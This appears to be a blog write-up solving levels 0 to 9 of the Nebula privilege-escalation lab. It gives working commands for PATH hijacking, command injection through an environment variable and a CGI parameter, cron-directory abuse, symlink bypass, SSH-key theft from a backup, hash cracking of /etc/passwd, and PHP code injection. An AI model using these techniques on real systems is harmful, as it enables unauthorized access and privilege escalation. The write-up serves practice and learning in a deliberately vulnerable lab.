-<p>There&rsquo;s no copy paste for Ubuntu Server VMs, but I included the output when it supplemented the solution.</p>
-
-<h2>Level 0</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level00">(full)</a>: Find a file with setuid permissions.</p>
-
-<div>
-  <pre><code class='bash'>$ find / -perm /u+s</code></pre>
-</div>
-
-
-<p>Search the root directory for files based on permissions. The file <code>/bin/.../flag00</code> looks suspicious.</p>
-
-<!-- more -->
-
-
-<h2>Level 1</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level01">(full)</a>: Given a program that calls <code>/usr/bin/env echo and now what?</code>, execute an arbitrary program.</p>
-
-<div>
-  <pre><code class='console'>$ export PATH=~:$PATH
-$ /bin/echo &quot;whoami; getflag&quot; &gt; ~/echo
-$ chmod a+x ~/echo
-$ /home/flag01/flag01</code></pre>
-</div>
-
-
-<p><code>env</code> looks in the <code>PATH</code> variable to find a program to run. Adding an executable named <code>echo</code> to an earlier directory in the path will execute the program.</p>
-
-<h2>Level 2</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level02">(full)</a>: Given a program that calls <code>/bin/echo $USER</code>, execute an arbitrary program.</p>
-
-<div>
-  <pre><code class='console'>$ export USER=&quot;hi echoing; whoami; getflag&quot;
-$ /home/flag02/flag02
-about to call system(&quot;/bin/echo hi echoing; whoami; getflag is cool&quot;)
-hi echoing
-flag02
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<h2>Level 3</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level03">(full)</a>: There is a <code>cron</code> job that runs occasionally. In the home directory, there is a <code>writable.sh</code> and a <code>writable.d/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag03
-$ ls
-writable.d   writable.sh
-
-$ # ./writable.sh runs a for loop with &quot;bash -x $i&quot; for i in writable.d/*
-$ echo &quot;whoami&quot; &gt; /tmp/log; getflag &gt;&gt; /tmp/log&quot; &gt; ./writable.d/foo
-$ # Wait a few minutes for the cron job
-$ cat /tmp/log
-flag03
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<p>Since cron jobs don&rsquo;t write output to <code>stdout</code>, the output should be logged in a file.</p>
-
-<h2>Level 4</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level04">(full)</a>: The program <code>flag04</code> dumps the contents of a file to stdout, unless there is a substring match with the string <code>"token"</code>. Examine the file <code>/home/flag04/token/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /tmp/
-$ ln -s /home/flag04/ ./foo
-$ cd /home/flag04/
-$ ./flag04 /tmp/foo</code></pre>
-</div>
-
-
-<p><code>token</code> contains the password to the <code>flag04</code> account. <code>su flag04</code> and capture the flag.</p>
-
-<h2>Level 5</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level05">(full)</a>: Exploit the directory permissions in <code>/home/flag05/</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag05
-$ ls -la
-$ `/home/flag05` contains `.ssh` (unreadable) and `.backup` (execute access!) directories
-$ ls .backup
-backup-19072011.tgz
-$ # tar tzf backup-19072011.tgz shows that it contains the .ssh directory
-$ cd .backup
-$ tar xzf backup-19072011.tgz -C ~
-$ cd ~/.ssh
-$ ssh -i id_rsa flag05@localhost
-flag05@nebula:~$ getflag</code></pre>
-</div>
-
-
-<p>The <code>-C</code> flag for <code>tar</code> switches directories before unarchiving. We then ssh to our own machine, but this time as <code>flag05</code>.</p>
-
-<h2>Level 6</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level06">(full)</a>: The <code>flag06</code> account credentials are from a legacy UNIX system.</p>
-
-<p>Account credentials points toward <code>/etc/passwd</code>:</p>
-
-<div>
-  <pre><code class='console'>$ cat /etc/passwd/ |  grep flag06
-flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh</code></pre>
-</div>
-
-
-<p>According to the Internet, older UNIX systems stored the salted, hashed passwords in <code>/etc/passwd</code>. Now, these are placed in the no-read <code>/etc/shadow/</code> (or a variant). The <code>flag06</code> is a one way hash, but <a href="http://www.openwall.com/john/">John the Ripper</a> can crack it. No special permissions are required to use it.</p>
-
-<div>
-  <pre><code class='console'>$ cd ~
-$ wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
-$ tar xzf john-1.7.9.tar.gz
-$ cd john-1.7.9.tar.gz/src
-$ make clean linux-x86-sse2
-$ cd ../run
-$ ./john /etc/passwd
-Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
-hello             (flag06)
-...
-$ su flag06
-Password:
-sh-4.2$ getflag</code></pre>
-</div>
-
-
-<h2>Level 7</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level07">(full)</a>: A Perl CGI script attempts to ping a given host.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag07
-$ perl index.cgi Host=&quot;google.com | getflag&quot;
-$ # Yields a &quot;getflag is executing on a non-flag account, this doesn't count&quot;
-$ cat thttpd.conf | grep flag07
-dir=/home/flag07
-user=flag07
-$ ps aux | grep thttpd
-$ # Interestingly, two thttpd web server instances are running on flag07 and flag16
-$ cat thttpd.conf | grep port=
-port=7007
-$ cd ~ &amp;&amp; wget localhost:7007/index.cgi --post-data=&quot;Host=google.com | getflag&quot;
-$ cat index.cgi
-&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;You have successfully executed getflag on a target account&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>
-</div>
-
-
-<p>If we run the script with <code>perl</code>, <code>getflag</code> still runs as the <code>level07</code> user. The vulnerability exists in <code>thttpd.conf</code>, which runs commands as <code>flag07</code> (<code>user=flag07</code>). Capturing the flag requires using <code>thttpd.conf</code>.</p>
-
-<p><code>ps aux</code> shows that a web server using <a href="http://www.acme.com/software/thttpd/">thttpd</a> is running. Using <code>wget localhost:7007/index.cgi</code>, the parameter is passed in as the <code>flag07</code> user.</p>
-
-<h2>Level 8</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level08">(full)</a>: Examine a <code>capture.pcap</code> file to see what <code>flag08</code> was doing.</p>
-
-<div>
-  <pre><code class='console'>$ cd /home/flag08
-$ # -X prints in ASCII; -q removes extraneous information, -r points to a file
-$ tcpdump -X -q -r capture.pcap | less</code></pre>
-</div>
-
-
-<p>After mucking around with <code>tcpdump</code> in ASCII mode, however, it&rsquo;s clear that the output is still unintelligible. The Internet (broadly speaking) suggests Wireshark (and its command line counterpart, <code>tshark</code>) to examine packets, but the virtual machine doesn&rsquo;t have these. However, a program named <code>tcpflow</code> is available.</p>
-
-<div>
-  <pre><code class='console'>$ # -c prints to stdout, -r points to a file
-$ tcpflow -c -r capture.pcap | less</code></pre>
-</div>
-
-
-<p>After the <code>Password:</code> prompt, the <code>flag08</code> user typed &ldquo;backdoor&hellip;00Rm8.ate&rdquo;. A few tries for <code>su flag08</code> with <code>backdoor</code> and <code>backdoor...00Rm8.ate</code> are unsuccessful. But if we believe that:
-1. the password is based on words
-2. each packet represents a key press to the server
-&ldquo;Backdoor mate&rdquo; could be <code>backdoorm8</code>, <code>backd00Rm8</code>, etc. If the period represents deletion, then the password is <code>backd00Rmate</code>.</p>
-
-<div>
-  <pre><code class='console'>$ su flag08
-Password:
-sh-4.2$ getflag</code></pre>
-</div>
-
-
-<h2>Level 9</h2>
-
-<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level09">(full)</a>: Exploit a C wrapper for a PHP script. The PHP script uses one argument but accepts a second, unused one &mdash; <code>$useme</code>.</p>
-
-<div>
-  <pre><code class='console'>$ cd ~
-$ echo &quot;[email {\$use_me(getflag)}]&quot; &gt; foo
-$ /home/flag09/flag09 ./foo exec
-[error]
-You have successfully executed getflag on target account</code></pre>
-</div>
-
-
-<p>This exploits PHP&rsquo;s &ldquo;variable of variables.&rdquo; Executing <code>flag09 ~/foo system</code> also works.</p>
 ]]></content>
   </entry>
   
